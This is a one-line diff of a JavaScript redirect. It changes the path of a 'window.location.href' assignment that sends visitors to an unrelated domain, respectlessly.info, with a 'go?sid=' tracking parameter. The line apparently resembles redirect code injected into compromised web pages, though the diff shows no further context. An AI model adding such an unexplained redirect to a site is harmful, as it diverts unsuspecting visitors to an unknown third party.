@@ -1,1 +1,1 @@
-window.location.href = "https://respectlessly.info/uko/go?sid=7744";
+window.location.href = "https://respectlessly.info/Rqndk/go?sid=7744";
